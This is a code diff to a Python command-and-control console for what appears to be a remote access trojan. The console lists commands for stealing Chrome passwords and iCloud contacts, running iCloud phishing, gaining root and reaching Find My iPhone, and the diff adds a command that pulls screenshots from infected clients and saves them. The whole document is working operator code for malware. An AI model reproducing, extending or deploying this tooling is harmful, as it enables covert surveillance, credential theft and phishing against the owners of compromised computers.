@@ -5,6 +5,8 @@ import ssl
 import thread
 import os
 import struct
+import base64
+import uuid
 try:
     import gnureadline
 except ImportError:
@@ -24,7 +26,7 @@ MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
 commands = ["help", "status", "clients", "connect", "clear", "get_info", "get_root", "get_computer_name",
-            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "find_my_iphone", "kill_client"]
+            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "find_my_iphone", "screenshot", "kill_client"]
 status_messages = []
 
 # The ID of the client is it's place in the array
@@ -268,6 +270,20 @@ if __name__ == '__main__':
                                 response = send_command(connections[current_client_id], "find_my_iphone {0} {1}".format(email, password))
 
                                 print response
+                        elif command == "screenshot":
+                            response = send_command(connections[current_client_id], "screenshot")
+
+                            output_name = str(uuid.uuid4()).replace("-", "")[:12] + ".jpg"
+                            output_folder = os.path.join(os.path.dirname(__file__), "Screenshots")
+                            output_file = os.path.join(output_folder, output_name)
+
+                            if not os.path.isdir(output_folder):
+                                os.mkdir(output_folder)
+
+                            with open(output_file, "w") as open_file:
+                                open_file.write(base64.b64decode(response))
+
+                            print MESSAGE_INFO + "Screenshot saved to: {0}".format(output_file)
                         elif command == "kill_client":
                             print MESSAGE_INFO + "Removing server..."
                             response = send_command(connections[current_client_id], "kill_client")
